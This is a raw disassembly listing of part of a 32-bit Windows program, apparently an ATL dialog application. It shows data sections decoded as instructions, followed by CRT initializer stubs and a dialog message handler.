  4016d9:	add    BYTE PTR [eax+eax*1+0x6c],ah
  4016dd:	add    BYTE PTR [eax+eax*1+0x0],ch
  4016e1:	add    BYTE PTR [eax],al
  4016e3:	add    BYTE PTR [edx+0x65],dl
  4016e6:	addr16 inc esp
  4016e8:	gs ins BYTE PTR es:[edi],dx
  4016ea:	gs je  0x401752
  4016ed:	dec    ebx
  4016ee:	gs jns 0x401736
  4016f1:	js     0x40174a
  4016f3:	add    BYTE PTR [ecx+0x0],ah
  4016f6:	add    BYTE PTR fs:[esi+0x0],dh
  4016fa:	popa   
  4016fb:	add    BYTE PTR [eax+0x0],dh
  4016fe:	imul   eax,DWORD PTR [eax],0x320033
  401704:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  401709:	add    BYTE PTR [eax+eax*1+0x0],ch
  40170d:	add    BYTE PTR [eax],al
  40170f:	add    BYTE PTR [edx+0x65],dl
  401712:	addr16 inc esp
  401714:	gs ins BYTE PTR es:[edi],dx
  401716:	gs je  0x40177e
  401719:	dec    ebx
  40171a:	gs jns 0x401774
  40171d:	add    BYTE PTR [eax],al
  40171f:	add    BYTE PTR [eax],bh
  401721:	pop    ss
  401722:	inc    eax
  401723:	add    BYTE PTR [eax],ah
  401725:	add    BYTE PTR [eax],al
  401727:	add    BYTE PTR [ecx],al
	...
  401735:	add    BYTE PTR [eax],al
  401737:	add    BYTE PTR [edi-0x36],dh
  40173a:	imul   ecx,DWORD PTR [ecx-0x58],0xfffffffe
  40173e:	mov    bh,0x40
  401740:	mov    esi,0x50d99065
  401745:	sub    al,0x45
  401747:	inc    BYTE PTR [eax]
  401749:	add    BYTE PTR [eax],al
  40174b:	add    BYTE PTR [ebx+0x0],bh
  40174e:	add    BYTE PTR [eax],al
  401750:	jge    0x401752
  401752:	add    BYTE PTR [eax],al
  401754:	add    BYTE PTR [eax],al
  401756:	add    BYTE PTR [eax],al
  401758:	push   edi
  401759:	add    BYTE PTR [ecx+0x0],ch
  40175c:	outs   dx,BYTE PTR ds:[esi]
  40175d:	add    BYTE PTR [eax+eax*1+0x6f],ah
  401761:	add    BYTE PTR [edi+0x0],dh
  401764:	jae    0x401766
  401766:	and    BYTE PTR [eax],al
  401768:	dec    ebp
  401769:	add    BYTE PTR [ebp+0x0],ah
  40176c:	add    BYTE PTR fs:[ecx+0x0],ch
  401770:	popa   
  401771:	add    BYTE PTR [eax],ah
  401773:	add    BYTE PTR [edx+0x0],dl
  401776:	add    BYTE PTR gs:[esi+0x0],dh
  40177a:	outs   dx,DWORD PTR ds:[esi]
  40177b:	add    BYTE PTR [ebx+0x0],ah
  40177e:	popa   
  40177f:	add    BYTE PTR [eax+eax*1+0x69],dh
  401783:	add    BYTE PTR [edi+0x0],ch
  401786:	outs   dx,BYTE PTR ds:[esi]
  401787:	add    BYTE PTR [eax],ah
  401789:	add    BYTE PTR [ecx+0x0],ah
  40178c:	outs   dx,BYTE PTR ds:[esi]
  40178d:	add    BYTE PTR [eax+eax*1+0x20],ah
  401791:	add    BYTE PTR [edx+0x0],dl
  401794:	add    BYTE PTR gs:[esi+0x0],ch
  401798:	add    BYTE PTR gs:[edi+0x0],dh
  40179c:	popa   
  40179d:	add    BYTE PTR [eax+eax*1+0x0],ch
  4017a1:	add    BYTE PTR [eax],al
  4017a3:	add    BYTE PTR [eax+0x0],cl
  4017a6:	push   edx
  4017a7:	add    BYTE PTR [ebp+0x0],al
  4017aa:	push   ebx
  4017ab:	add    BYTE PTR [ebp+0x0],dl
  4017ae:	dec    esp
  4017af:	add    BYTE PTR [eax+eax*1+0x20],dl
  4017b3:	add    BYTE PTR [eax],dh
  4017b5:	add    BYTE PTR [eax+0x0],bh
  4017b8:	and    eax,0x2e003800
  4017bd:	add    BYTE PTR [eax],bh
  4017bf:	add    BYTE PTR [eax+0x0],bh
  4017c2:	add    BYTE PTR [eax],al
  4017c4:	loopne 0x401803
  4017c6:	dec    esp
  4017c7:	cmp    DWORD PTR [edi+0x3c],ebp
  4017ca:	rcl    BYTE PTR [ecx],cl
  4017cc:	cmp    DWORD PTR [ebx+0x0],0x7a794fc0
  4017d3:	mov    bh,0x61
  4017d5:	je     0x401843
  4017d7:	je     0x401841
  4017d9:	jne    0x401849
  4017db:	imul   ebp,DWORD PTR [esi],0x64
  4017de:	ins    BYTE PTR es:[edi],dx
  4017df:	ins    BYTE PTR es:[edi],dx
  4017e0:	add    BYTE PTR [eax],al
  4017e2:	add    BYTE PTR [eax],al
  4017e4:	inc    ecx
  4017e5:	je     0x401853
  4017e7:	push   esp
  4017e8:	push   0x5f6b6e75
  4017ed:	inc    ecx
  4017ee:	ins    BYTE PTR es:[edi],dx
  4017ef:	ins    BYTE PTR es:[edi],dx
  4017f0:	outs   dx,DWORD PTR ds:[esi]
  4017f1:	arpl   WORD PTR [ecx+0x74],sp
  4017f4:	gs inc esp
  4017f6:	popa   
  4017f7:	je     0x40185a
  4017f9:	add    BYTE PTR [eax],al
  4017fb:	add    BYTE PTR [ecx+0x74],al
  4017fe:	ins    BYTE PTR es:[edi],dx
  4017ff:	push   esp
  401800:	push   0x5f6b6e75
  401805:	dec    ecx
  401806:	outs   dx,BYTE PTR ds:[esi]
  401807:	imul   esi,DWORD PTR [esp+eax*2+0x61],0x6174
  40180f:	add    BYTE PTR [ecx+0x74],al
  401812:	ins    BYTE PTR es:[edi],dx
  401813:	push   esp
  401814:	push   0x5f6b6e75
  401819:	inc    esp
  40181a:	popa   
  40181b:	je     0x40187e
  40181d:	push   esp
  40181e:	outs   dx,DWORD PTR ds:[esi]
  40181f:	inc    ebx
  401820:	outs   dx,DWORD PTR ds:[esi]
  401821:	fs add BYTE PTR gs:[ecx+0x74],al
  401826:	ins    BYTE PTR es:[edi],dx
  401827:	push   esp
  401828:	push   0x5f6b6e75
  40182d:	inc    esi
  40182e:	jb     0x401895
  401830:	gs inc esp
  401832:	popa   
  401833:	je     0x401896
  401835:	add    BYTE PTR [eax],al
  401837:	add    BYTE PTR [ebx+0x0],al
  40183a:	popa   
  40183b:	add    BYTE PTR [eax+eax*1+0x65],dh
  40183f:	add    BYTE PTR [edi+0x0],ah
  401842:	outs   dx,DWORD PTR ds:[esi]
  401843:	add    BYTE PTR [edx+0x0],dh
  401846:	jns    0x401848
  401848:	dec    ecx
  401849:	add    BYTE PTR [eax+eax*1+0x73],al
  40184d:	add    BYTE PTR [eax],ah
  40184f:	add    BYTE PTR [ebx+0x0],ah
  401852:	outs   dx,DWORD PTR ds:[esi]
  401853:	add    BYTE PTR [esi+0x0],ch
  401856:	je     0x401858
  401858:	popa   
  401859:	add    BYTE PTR [ecx+0x0],ch
  40185c:	outs   dx,BYTE PTR ds:[esi]
  40185d:	add    BYTE PTR [ebx+0x0],dh
  401860:	and    BYTE PTR [eax],al
  401862:	daa    
  401863:	add    BYTE PTR [eax],al
  401865:	add    BYTE PTR [eax],al
  401867:	add    BYTE PTR [ebp+0x0],dl
  40186a:	jo     0x40186c
  40186c:	add    BYTE PTR fs:[ecx+0x0],ah
  401870:	je     0x401872
  401872:	add    BYTE PTR gs:[ecx+0x0],cl
  401876:	inc    esp
  401877:	add    BYTE PTR ds:0x2700,bh
  40187d:	add    BYTE PTR [eax],al
  40187f:	add    BYTE PTR [edi],ah
  401881:	add    BYTE PTR [eax],al
  401883:	add    BYTE PTR [edi+0x0],ch
  401886:	jo     0x401888
  401888:	add    BYTE PTR gs:[esi+0x0],ch
  40188c:	add    BYTE PTR [eax],al
  40188e:	add    BYTE PTR [eax],al
  401890:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401891:	pop    eax
  401892:	push   0x60260d81
  401897:	inc    edx
  401898:	xchg   ebx,eax
  401899:	cmp    ah,BYTE PTR ds:0xc7abf185
  40189f:	imul   eax,DWORD PTR [eax],0x0
  4018a2:	add    BYTE PTR [eax],al
  4018a4:	add    BYTE PTR [eax],al
  4018a6:	add    BYTE PTR [eax],al
  4018a8:	rol    BYTE PTR [eax],0x0
  4018ab:	add    BYTE PTR [eax],al
  4018ad:	add    BYTE PTR [eax],al
  4018af:	inc    esi
  4018b0:	jg     0x4018ef
  4018b2:	mov    ah,0x4c
  4018b4:	out    dx,al
  4018b5:	jle    0x4018bd
  4018b7:	dec    ecx
  4018b8:	xchg   BYTE PTR [eax+0x381cda60],bl
  4018be:	repnz (bad) 
  4018c0:	repz div ah
  4018c3:	inc    ebp
  4018c4:	add    dl,dh
  4018c6:	cwde   
  4018c7:	dec    edi
  4018c8:	call   0xd22a:0x15fa3e8a
  4018cf:	rcl    ebp,cl
  4018d1:	add    dl,BYTE PTR [eax+eiz*8]
  4018d4:	(bad)  
  4018d6:	mov    edx,0x3812a043
  4018db:	mov    DWORD PTR [ebx-0x30],ecx
  4018de:	dec    eax
  4018df:	icebp  
  4018e0:	dec    ax
  4018e2:	and    eax,0x8e9f5b77
  4018e7:	dec    esp
  4018e8:	mov    ecx,0x857ac7e2
  4018ed:	xor    dh,dl
  4018ef:	dec    ebx
  4018f0:	fstp   QWORD PTR [edi+edi*1]
  4018f3:	mov    WORD PTR [ebx+0x61],?
  4018f6:	xchg   ecx,eax
  4018f7:	inc    ebp
  4018f8:	scas   al,BYTE PTR es:[edi]
  4018f9:	mov    ebp,0xca536aa5
  4018fe:	ja     0x4018c1
  401900:	add    BYTE PTR [eax],al
  401902:	add    BYTE PTR [eax],al
  401904:	loope  0x401942
  401906:	lahf   
  401907:	push   ebp
  401908:	add    BYTE PTR [eax],al
  40190a:	add    BYTE PTR [eax],al
  40190c:	add    al,BYTE PTR [eax]
  40190e:	add    BYTE PTR [eax],al
  401910:	sub    BYTE PTR [eax],al
  401912:	add    BYTE PTR [eax],al
  401914:	les    ebx,FWORD PTR [ecx]
  401916:	add    BYTE PTR [eax],al
  401918:	les    ecx,FWORD PTR ds:0x0
  40191e:	add    BYTE PTR [eax],al
  401920:	loope  0x40195e
  401922:	lahf   
  401923:	push   ebp
  401924:	add    BYTE PTR [eax],al
  401926:	add    BYTE PTR [eax],al
  401928:	or     eax,0x18000000
  40192d:	add    al,BYTE PTR [eax]
  40192f:	add    BYTE PTR [eax],al
  401931:	sbb    al,BYTE PTR [eax]
  401933:	add    BYTE PTR [eax],al
  401935:	push   cs
	...
  401956:	add    BYTE PTR [eax],al
  401958:	push   0x0
	...
  401991:	add    BYTE PTR [eax],al
  401993:	add    BYTE PTR [eax],cl
  401995:	add    BYTE PTR [eax+0x0],0xc0
  401999:	sbb    DWORD PTR [eax+0x0],eax
  40199c:	add    DWORD PTR [eax],eax
  40199e:	add    BYTE PTR [eax],al
  4019a0:	push   esp
  4019a1:	xchg   edx,eax
  4019a2:	inc    eax
  4019a3:	add    BYTE PTR [eax],al
  4019a5:	add    BYTE PTR [eax],al
  4019a7:	add    BYTE PTR [eax],dh
  4019a9:	adc    BYTE PTR [eax+0x0],al
  4019ac:	push   eax
  4019ad:	add    BYTE PTR [eax],al
  4019af:	add    BYTE PTR [eax],al
  4019b1:	xor    eax,0x0
	...
  4019be:	add    BYTE PTR [eax],al
  4019c0:	and    BYTE PTR [ecx+0x0],bh
  4019c3:	add    BYTE PTR [edx+0x53],dl
  4019c6:	inc    esp
  4019c7:	push   ebx
  4019c8:	cli    
  4019c9:	mov    edx,0xbd78ef64
  4019ce:	dec    si
  4019d0:	popf   
  4019d1:	shl    BYTE PTR [ebx-0x77178446],0x81
  4019d8:	add    DWORD PTR [eax],eax
  4019da:	add    BYTE PTR [eax],al
  4019dc:	push   edx
  4019dd:	push   edx
  4019de:	dec    ecx
  4019df:	outs   dx,BYTE PTR ds:[esi]
  4019e0:	jae    0x401a56
  4019e2:	popa   
  4019e3:	ins    BYTE PTR es:[edi],dx
  4019e4:	ins    BYTE PTR es:[edi],dx
  4019e5:	gs jb  0x401a16
  4019e8:	jo     0x401a4e
  4019ea:	bound  eax,QWORD PTR [eax]
	...
  401a00:	inc    edi
  401a01:	inc    ebx
  401a02:	push   esp
  401a03:	dec    esp
  401a04:	add    BYTE PTR [eax],dl
  401a06:	add    BYTE PTR [eax],al
  401a08:	add    al,0x0
  401a0a:	add    BYTE PTR [eax],al
  401a0c:	cs inc ebx
  401a0e:	push   edx
  401a0f:	push   esp
  401a10:	and    al,0x58
  401a12:	inc    ebx
  401a13:	inc    ecx
  401a14:	add    BYTE PTR [eax],al
  401a16:	add    BYTE PTR [eax],al
  401a18:	add    al,0x10
  401a1a:	add    BYTE PTR [eax],al
  401a1c:	add    al,0x0
  401a1e:	add    BYTE PTR [eax],al
  401a20:	cs inc ebx
  401a22:	push   edx
  401a23:	push   esp
  401a24:	and    al,0x58
  401a26:	inc    ebx
  401a27:	inc    ecx
  401a28:	inc    ecx
  401a29:	add    BYTE PTR [eax],al
  401a2b:	add    BYTE PTR [eax],cl
  401a2d:	adc    BYTE PTR [eax],al
  401a2f:	add    BYTE PTR [eax],dl
  401a31:	add    BYTE PTR [eax],al
  401a33:	add    BYTE PTR [esi],ch
  401a35:	inc    ebx
  401a36:	push   edx
  401a37:	push   esp
  401a38:	and    al,0x58
  401a3a:	inc    ebx
  401a3b:	dec    esp
  401a3c:	add    BYTE PTR [eax],al
  401a3e:	add    BYTE PTR [eax],al
  401a40:	sbb    BYTE PTR [eax],dl
  401a42:	add    BYTE PTR [eax],al
  401a44:	add    al,0x0
  401a46:	add    BYTE PTR [eax],al
  401a48:	cs inc ebx
  401a4a:	push   edx
  401a4b:	push   esp
  401a4c:	and    al,0x58
  401a4e:	inc    ebx
  401a4f:	push   ebp
  401a50:	add    BYTE PTR [eax],al
  401a52:	add    BYTE PTR [eax],al
  401a54:	sbb    al,0x10
  401a56:	add    BYTE PTR [eax],al
  401a58:	add    al,0x0
  401a5a:	add    BYTE PTR [eax],al
  401a5c:	cs inc ebx
  401a5e:	push   edx
  401a5f:	push   esp
  401a60:	and    al,0x58
  401a62:	inc    ebx
  401a63:	pop    edx
  401a64:	add    BYTE PTR [eax],al
  401a66:	add    BYTE PTR [eax],al
  401a68:	and    BYTE PTR [eax],dl
  401a6a:	add    BYTE PTR [eax],al
  401a6c:	add    al,0x0
  401a6e:	add    BYTE PTR [eax],al
  401a70:	cs inc ebx
  401a72:	push   edx
  401a73:	push   esp
  401a74:	and    al,0x58
  401a76:	dec    ecx
  401a77:	inc    ecx
  401a78:	add    BYTE PTR [eax],al
  401a7a:	add    BYTE PTR [eax],al
  401a7c:	and    al,0x10
  401a7e:	add    BYTE PTR [eax],al
  401a80:	add    al,0x0
  401a82:	add    BYTE PTR [eax],al
  401a84:	cs inc ebx
  401a86:	push   edx
  401a87:	push   esp
  401a88:	and    al,0x58
  401a8a:	dec    ecx
  401a8b:	inc    ecx
  401a8c:	inc    ecx
  401a8d:	add    BYTE PTR [eax],al
  401a8f:	add    BYTE PTR [eax],ch
  401a91:	adc    BYTE PTR [eax],al
  401a93:	add    BYTE PTR [eax+eax*1],al
  401a96:	add    BYTE PTR [eax],al
  401a98:	cs inc ebx
  401a9a:	push   edx
  401a9b:	push   esp
  401a9c:	and    al,0x58
  401a9e:	dec    ecx
  401a9f:	pop    ecx
  401aa0:	add    BYTE PTR [eax],al
  401aa2:	add    BYTE PTR [eax],al
  401aa4:	sub    al,0x10
  401aa6:	add    BYTE PTR [eax],al
  401aa8:	add    al,0x0
  401aaa:	add    BYTE PTR [eax],al
  401aac:	cs inc ebx
  401aae:	push   edx
  401aaf:	push   esp
  401ab0:	and    al,0x58
  401ab2:	dec    ecx
  401ab3:	pop    edx
  401ab4:	add    BYTE PTR [eax],al
  401ab6:	add    BYTE PTR [eax],al
  401ab8:	xor    BYTE PTR [eax],dl
  401aba:	add    BYTE PTR [eax],al
  401abc:	inc    eax
  401abd:	add    DWORD PTR [eax],eax
  401abf:	add    BYTE PTR [esi],ch
  401ac1:	imul   sp,WORD PTR [si+0x73],0x7824
  401ac8:	add    BYTE PTR [eax],al
  401aca:	add    BYTE PTR [eax],al
  401acc:	jo     0x401adf
  401ace:	add    BYTE PTR [eax],al
  401ad0:	push   eax
  401ad1:	or     BYTE PTR [eax],al
  401ad3:	add    BYTE PTR [esi],ch
  401ad5:	jb     0x401b3b
  401ad7:	popa   
  401ad8:	je     0x401b3b
  401ada:	add    BYTE PTR [eax],al
  401adc:	rcr    BYTE PTR [ecx],0x0
  401adf:	add    BYTE PTR [eax+eax*1],al
  401ae2:	add    BYTE PTR [eax],al
  401ae4:	cs jb  0x401b4b
  401ae7:	popa   
  401ae8:	je     0x401b4b
  401aea:	and    al,0x73
  401aec:	js     0x401b52
  401aee:	popa   
  401aef:	je     0x401b52
  401af1:	add    BYTE PTR [eax],al
  401af3:	add    ah,al
  401af5:	sbb    DWORD PTR [eax],eax
  401af7:	add    BYTE PTR [edx+eax*1+0x0],dl
  401afb:	add    BYTE PTR [esi],ch
  401afd:	jb     0x401b63
  401aff:	popa   
  401b00:	je     0x401b63
  401b02:	and    al,0x7a
  401b04:	jp     0x401b80
  401b06:	bound  esp,QWORD PTR fs:[edi+0x0]
  401b0a:	add    BYTE PTR [eax],al
  401b0c:	sbb    BYTE PTR [eax+eax*1],bl
  401b0f:	add    ah,ah
  401b11:	add    BYTE PTR [eax],al
  401b13:	add    BYTE PTR [esi],ch
  401b15:	je     0x401b7c
  401b17:	js     0x401b8d
  401b19:	and    al,0x64
  401b1b:	imul   eax,DWORD PTR [eax],0x0
  401b21:	sbb    eax,0x5df60000
  401b26:	add    BYTE PTR [eax],al
  401b28:	cs je  0x401b90
  401b2b:	js     0x401ba1
  401b2d:	and    al,0x6d
  401b2f:	outs   dx,BYTE PTR ds:[esi]
  401b30:	add    BYTE PTR [eax],al
  401b32:	add    BYTE PTR [eax],al
  401b34:	idiv   BYTE PTR [edx+0x0]
  401b37:	add    BYTE PTR [ebp+0x2e000000],al
  401b3d:	je     0x401ba4
  401b3f:	js     0x401bb5
  401b41:	and    al,0x79
  401b43:	add    BYTE PTR fs:[eax],al
  401b46:	add    BYTE PTR [eax],al
  401b48:	cmp    BYTE PTR [ebx+0x0],0x0
  401b4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b4d:	add    BYTE PTR [eax],al
  401b4f:	add    BYTE PTR [esi],ch
  401b51:	js     0x401bb7
  401b53:	popa   
  401b54:	je     0x401bb7
  401b56:	and    al,0x78
  401b58:	add    BYTE PTR [eax],al
  401b5a:	add    BYTE PTR [eax],al
  401b5c:	add    BYTE PTR [eax+0x600000],al
  401b62:	add    BYTE PTR [eax],al
  401b64:	cs fs popa 
  401b67:	je     0x401bca
  401b69:	add    BYTE PTR [eax],al
  401b6b:	add    BYTE PTR [eax+0x50000080],al
  401b71:	add    al,0x0
  401b73:	add    BYTE PTR [esi],ch
  401b75:	bound  esi,QWORD PTR [ebx+0x73]
  401b78:	add    BYTE PTR [eax],al
  401b7a:	add    BYTE PTR [eax],al
  401b7c:	add    BYTE PTR [eax+0x2540000],dl
  401b82:	add    BYTE PTR [eax],al
  401b84:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x352461
  401b8d:	add    BYTE PTR [eax],al
  401b8f:	add    BYTE PTR [edx+edx*4+0x0],dl
  401b93:	add    BYTE PTR [eax+eax*1],al
  401b96:	add    BYTE PTR [eax],al
  401b98:	xor    BYTE PTR cs:[eax],dh
  401b9b:	arpl   WORD PTR [esi+0x67],sp
  401b9e:	add    BYTE PTR [eax],al
  401ba0:	pop    eax
  401ba1:	xchg   edx,eax
  401ba2:	add    BYTE PTR [eax],al
  401ba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ba5:	add    DWORD PTR [eax],eax
  401ba7:	add    BYTE PTR [esi],ch
  401ba9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x322461
  401bb1:	add    BYTE PTR [eax],al
  401bb3:	add    ah,bh
  401bb5:	xchg   ebx,eax
  401bb6:	add    BYTE PTR [eax],al
  401bb8:	adc    al,0x0
  401bba:	add    BYTE PTR [eax],al
  401bbc:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x332461
  401bc5:	add    BYTE PTR [eax],al
  401bc7:	add    BYTE PTR [eax],dl
  401bc9:	xchg   esp,eax
  401bca:	add    BYTE PTR [eax],al
  401bcc:	push   esp
  401bcd:	add    al,BYTE PTR [eax]
  401bcf:	add    BYTE PTR [esi],ch
  401bd1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x342461
  401bd9:	add    BYTE PTR [eax],al
  401bdb:	add    BYTE PTR [esi+edx*4+0x0],ah
  401bdf:	add    BYTE PTR [eax],dh
  401be1:	or     al,BYTE PTR [eax]
  401be3:	add    BYTE PTR [esi],ch
  401be5:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x362461
  401bed:	add    BYTE PTR [eax],al
  401bef:	add    BYTE PTR [eax],al
  401bf1:	mov    al,0x0
  401bf3:	add    al,dh
  401bf5:	add    BYTE PTR [eax],al
  401bf7:	add    BYTE PTR [esi],ch
  401bf9:	jb     0x401c6e
  401bfb:	jb     0x401c60
  401bfd:	and    al,0x30
  401bff:	xor    DWORD PTR [eax],eax
  401c01:	add    BYTE PTR [eax],al
  401c03:	add    al,dh
  401c05:	mov    al,0x0
  401c07:	add    BYTE PTR [eax+0x2e000007],cl
  401c0d:	jb     0x401c82
  401c0f:	jb     0x401c74
  401c11:	and    al,0x30
  401c13:	xor    al,BYTE PTR [eax]
	...
  401c1d:	add    BYTE PTR [eax],al
  401c1f:	add    BYTE PTR [ebx+0x10be56ff],cl
  401c25:	test   BYTE PTR [eax+0x0],al
  401c28:	mov    ecx,0x408420
  401c2d:	mov    DWORD PTR ds:0x4083d4,esi
  401c33:	call   0x40256f
  401c38:	test   eax,eax
  401c3a:	jns    0x401c45
  401c3c:	mov    BYTE PTR ds:0x4083d0,0x1
  401c43:	jmp    0x401c4f
  401c45:	mov    DWORD PTR ds:0x408414,0x24
  401c4f:	push   0x407b00
  401c54:	mov    DWORD PTR ds:0x4083d8,esi
  401c5a:	mov    DWORD PTR ds:0x408410,0x401380
  401c64:	call   0x4072af
  401c69:	pop    ecx
  401c6a:	pop    esi
  401c6b:	ret    
  401c6c:	int3   
  401c6d:	int3   
  401c6e:	int3   
  401c6f:	int3   
  401c70:	call   0x40557e
  401c75:	push   0x407b20
  401c7a:	call   0x4072af
  401c7f:	pop    ecx
  401c80:	ret    
  401c81:	int3   
  401c82:	int3   
  401c83:	int3   
  401c84:	int3   
  401c85:	int3   
  401c86:	int3   
  401c87:	int3   
  401c88:	int3   
  401c89:	int3   
  401c8a:	int3   
  401c8b:	int3   
  401c8c:	int3   
  401c8d:	int3   
  401c8e:	int3   
  401c8f:	int3   
  401c90:	mov    ecx,0x408014
  401c95:	call   0x40256f
  401c9a:	test   eax,eax
  401c9c:	jns    0x401cac
  401c9e:	and    DWORD PTR ds:0x408010,0x0
  401ca5:	mov    BYTE PTR ds:0x4083d0,0x1
  401cac:	push   0x407b40
  401cb1:	call   0x4072af
  401cb6:	pop    ecx
  401cb7:	ret    
  401cb8:	int3   
  401cb9:	int3   
  401cba:	int3   
  401cbb:	int3   
  401cbc:	int3   
  401cbd:	int3   
  401cbe:	int3   
  401cbf:	int3   
  401cc0:	call   DWORD PTR ds:0x40914c
  401cc6:	push   0x407b60
  401ccb:	mov    DWORD PTR ds:0x408498,0x401430
  401cd5:	mov    ds:0x40849c,eax
  401cda:	mov    BYTE PTR ds:0x4084a0,0x0
  401ce1:	call   0x4072af
  401ce6:	pop    ecx
  401ce7:	ret    
  401ce8:	int3   
  401ce9:	int3   
  401cea:	int3   
  401ceb:	int3   
  401cec:	int3   
  401ced:	int3   
  401cee:	int3   
  401cef:	int3   
  401cf0:	push   0x407b70
  401cf5:	call   0x4072af
  401cfa:	pop    ecx
  401cfb:	ret    
  401cfc:	int3   
  401cfd:	int3   
  401cfe:	int3   
  401cff:	int3   
  401d00:	int3   
  401d01:	int3   
  401d02:	int3   
  401d03:	int3   
  401d04:	int3   
  401d05:	int3   
  401d06:	int3   
  401d07:	int3   
  401d08:	int3   
  401d09:	int3   
  401d0a:	int3   
  401d0b:	int3   
  401d0c:	int3   
  401d0d:	int3   
  401d0e:	int3   
  401d0f:	int3   
  401d10:	mov    edi,edi
  401d12:	push   ebp
  401d13:	mov    ebp,esp
  401d15:	cmp    DWORD PTR [ebp+0x1c],0x0
  401d19:	push   edi
  401d1a:	mov    edi,ecx
  401d1c:	jne    0x401db9
  401d22:	mov    eax,DWORD PTR [ebp+0xc]
  401d25:	cmp    eax,0x110
  401d2a:	jne    0x401d3e
  401d2c:	sub    esp,0x10
  401d2f:	call   0x4047de
  401d34:	mov    ecx,DWORD PTR [ebp+0x18]
  401d37:	mov    DWORD PTR [ecx],eax
  401d39:	xor    eax,eax
  401d3b:	inc    eax
  401d3c:	jmp    0x401dbb
  401d3e:	push   0x2
  401d40:	pop    ecx
  401d41:	cmp    eax,ecx
  401d43:	jne    0x401d6e
  401d45:	cmp    DWORD PTR ds:0x408418,0x1
  401d4c:	jne    0x401d5c
  401d4e:	and    DWORD PTR ds:0x408454,0x0
  401d55:	and    DWORD PTR ds:0x408458,0x0
  401d5c:	mov    ecx,0x408410
  401d61:	call   0x402290
  401d66:	mov    ecx,DWORD PTR [ebp+0x18]
  401d69:	and    DWORD PTR [ecx],0x0
  401d6c:	jmp    0x401d39
  401d6e:	cmp    eax,0x113
  401d73:	jne    0x401d81
  401d75:	sub    esp,0x10
  401d78:	mov    ecx,edi
  401d7a:	call   0x40485a
  401d7f:	jmp    0x401d34
  401d81:	cmp    eax,0x111
  401d86:	jne    0x401db9
  401d88:	cmp    cx,WORD PTR [ebp+0x10]
  401d8c:	jne    0x401db9
  401d8e:	push   ecx
  401d8f:	push   DWORD PTR [edi+0x4]
  401d92:	call   DWORD PTR ds:0x4090cc
  401d98:	mov    eax,DWORD PTR [edi+0x28]
  401d9b:	test   eax,eax
  401d9d:	je     0x401da7
  401d9f:	lock dec DWORD PTR [eax+0x2c]
  401da3:	and    DWORD PTR [edi+0x28],0x0
  401da7:	mov    ecx,0x408410
  401dac:	call   0x402290
  401db1:	mov    eax,DWORD PTR [ebp+0x18]
  401db4:	and    DWORD PTR [eax],0x0
  401db7:	jmp    0x401d39
  401db9:	xor    eax,eax
  401dbb:	pop    edi
  401dbc:	pop    ebp
  401dbd:	ret    0x18
  401dc0:	int3   
  401dc1:	int3   
  401dc2:	int3   
  401dc3:	int3   
  401dc4:	int3   
  401dc5:	int3   
  401dc6:	int3   
  401dc7:	int3   
  401dc8:	int3   
  401dc9:	int3   
  401dca:	int3   
  401dcb:	int3   
  401dcc:	int3   
  401dcd:	int3   
  401dce:	int3   
  401dcf:	int3   
  401dd0:	mov    edi,edi
  401dd2:	push   ebp
  401dd3:	mov    ebp,esp
  401dd5:	push   esi
  401dd6:	mov    esi,ecx
  401dd8:	mov    DWORD PTR [esi],0x401358
  401dde:	call   0x40261f
  401de3:	test   BYTE PTR [ebp+0x8],0x1
  401de7:	je     0x401df0
  401de9:	push   esi
  401dea:	call   0x406e3c
  401def:	pop    ecx
  401df0:	mov    eax,esi
  401df2:	pop    esi
  401df3:	pop    ebp
  401df4:	ret    0x4
  401df7:	int3   
  401df8:	int3   
  401df9:	int3   
  401dfa:	int3   
  401dfb:	int3   
  401dfc:	mov    edi,edi
  401dfe:	push   ebp
  401dff:	mov    ebp,esp
  401e01:	sub    esp,0x20
  401e04:	mov    eax,ds:0x408008
  401e09:	xor    eax,ebp
  401e0b:	mov    DWORD PTR [ebp-0x4],eax
  401e0e:	and    DWORD PTR [ebp-0x18],0x0
  401e12:	cmp    DWORD PTR ds:0x4083dc,0x0
  401e19:	mov    eax,DWORD PTR [ebp+0x10]
  401e1c:	push   ebx
  401e1d:	push   esi
  401e1e:	push   edi
  401e1f:	mov    esi,0x40145c
  401e24:	mov    DWORD PTR [ebp-0x20],eax
  401e27:	lea    edi,[ebp-0x14]
  401e2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e2e:	je     0x401e3a
  401e30:	mov    ebx,0x80070057
  401e35:	jmp    0x401f4f
  401e3a:	xor    esi,esi
  401e3c:	push   esi
  401e3d:	call   DWORD PTR ds:0x40924c
  401e43:	mov    ebx,eax
  401e45:	test   ebx,ebx
  401e47:	js     0x401f4f
  401e4d:	push   esi
  401e4e:	push   esi
  401e4f:	push   esi
  401e50:	push   esi
  401e51:	call   DWORD PTR ds:0x4090e8
  401e57:	push   0x4
  401e59:	pop    edi
  401e5a:	lea    eax,[ebp-0x1c]
  401e5d:	mov    DWORD PTR [ebp-0x1c],0x8
  401e64:	push   eax
  401e65:	mov    DWORD PTR [ebp-0x18],edi
  401e68:	call   DWORD PTR ds:0x409020
  401e6e:	push   0x2
  401e70:	push   esi
  401e71:	push   0x401444
  401e76:	call   DWORD PTR ds:0x40907c
  401e7c:	mov    DWORD PTR [ebp-0x18],eax
  401e7f:	test   eax,eax
  401e81:	jne    0x401ea3
  401e83:	call   DWORD PTR ds:0x409040
  401e89:	mov    ebx,eax
  401e8b:	test   ebx,ebx
  401e8d:	jle    0x401e9a
  401e8f:	movzx  ebx,bx
  401e92:	or     ebx,0x80070000
  401e98:	test   ebx,ebx
  401e9a:	js     0x401f4f
  401ea0:	mov    eax,DWORD PTR [ebp-0x18]
  401ea3:	mov    ecx,0x408464
  401ea8:	xchg   DWORD PTR [ecx],eax
  401eaa:	lea    eax,[ebp-0x14]
  401ead:	push   eax
  401eae:	push   DWORD PTR [ebp-0x20]
  401eb1:	call   DWORD PTR ds:0x409104
